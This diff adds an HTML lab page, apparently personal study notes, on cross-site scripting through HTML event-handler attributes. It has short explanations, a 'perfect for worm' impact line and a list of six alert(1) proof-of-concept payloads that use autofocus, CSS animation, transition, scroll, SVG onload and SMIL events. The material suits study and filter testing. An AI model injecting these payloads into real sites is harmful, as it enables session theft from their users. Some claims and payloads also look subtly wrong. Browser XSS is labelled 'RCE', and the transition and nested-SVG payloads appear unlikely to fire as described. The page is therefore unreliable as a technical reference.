@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Event Handlers</title>
+    <style>
+        :root{--bg:#0d0f17;--surface:#13151c;--text:#a0a8b8;--accent:#7aa2f7;--border:#24283b;--cyan:#7dcfff;--green:#9ece6a;--yellow:#e0af68;}
+        *{box-sizing:border-box;margin:0;padding:0;}
+        body{font-family:"Cascadia Code","Fira Mono",Consolas,monospace;background:var(--bg);color:var(--text);font-size:14px;line-height:1.6;min-height:100vh;}
+        .bar{background:var(--surface);border-bottom:1px solid var(--border);padding:8px 16px;display:flex;justify-content:space-between;position:sticky;top:0;z-index:10;}
+        .bar span{color:var(--accent);}
+        .wrap{max-width:960px;margin:auto;padding:2rem 1rem;}
+        .prompt{color:var(--green);}.cmd{color:var(--yellow);}
+        h1,h2,h3{color:var(--accent);margin-top:1.5rem;margin-bottom:.5rem;}
+        h1{font-size:1.4rem;}h2{font-size:1.2rem;}h3{font-size:1.05rem;}
+        code{background:var(--surface);border:1px solid var(--border);padding:2px 4px;border-radius:3px;color:var(--yellow);font-size:13px;}
+        pre{background:var(--surface);border:1px solid var(--border);border-radius:4px;padding:.75rem 1rem;overflow-x:auto;margin:.5rem 0;}
+        ul{margin-left:1.2rem;margin-top:.5rem;}li{margin-bottom:.25rem;}
+        footer{text-align:center;padding:2rem 0;color:var(--cyan);font-size:12px;}
+    </style>
+</head>
+<body>
+<div class="bar"><span>user@lab</span><span>~/xss/08-event-handlers</span></div>
+<main class="wrap">
+    <h1>Event Handlers</h1>
+
+    <h2>What they are</h2>
+    <p>HTML attributes that execute JS when a browser event fires. No need for &lt;script&gt; tags.</p>
+
+    <h2>Why they work</h2>
+    <p>Browser trusts attribute content as same-origin script; filters often whitelist attribute names.</p>
+
+    <h2>Where you’ll meet them</h2>
+    <p>User cards, image galleries, animated CSS widgets, SVG icons, auto-playing videos.</p>
+
+    <h2>Impact</h2>
+    <p>Zero-user-interaction RCE (auto-focus, animation-end, CSS scroll trick) → perfect for worm.</p>
+
+    <h2>Mini case-study</h2>
+    <p>2021 LinkedIn SVG avatar onanimationstart → stolen session → $5 000 bounty.</p>
+
+    <h2>Payloads</h2>
+    <!-- auto animation -->
+    <pre><code>// Fires as soon as element renders
+&lt;style&gt;@keyframes x{}&lt;/style&gt;
+&lt;div style="animation:x 1s" onanimationstart="alert(1)"&gt;&lt;/div&gt;</code></pre>
+
+    <!-- autofocus -->
+    <pre><code>// No click — focuses itself
+&lt;input onfocus="alert(1)" autofocus&gt;</code></pre>
+
+    <!-- SVG nested onload -->
+    <pre><code>// Double exec — outer + inner
+&lt;svg&gt;&lt;image href="data:image/svg+xml,&lt;svg onload=alert(1)&gt;" onload=alert(2)&gt;&lt;/svg&gt;</code></pre>
+
+    <!-- scroll trick -->
+    <pre><code>// :target scrolls → fires onscroll
+&lt;style&gt;div{height:50px;overflow:scroll}&lt;/style&gt;
+&lt;div onscroll="alert(1)"&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;/div&gt;
+#target</code></pre>
+
+    <!-- 0 s transition -->
+    <pre><code>// 0 s still ends → event fires
+&lt;div style="transition:all 0s" ontransitionend="alert(1)"&gt;&lt;/div&gt;</code></pre>
+
+    <!-- SMIL onbegin -->
+    <pre><code>// Firefox still supports SMIL
+&lt;svg&gt;&lt;animate onbegin="alert(1)" attributeName="x" dur="1s"&gt;&lt;/svg&gt;</code></pre>
+
+</main>
+<footer><span>EOF ── happy hacking :)</span></footer>
+</body>
+</html>
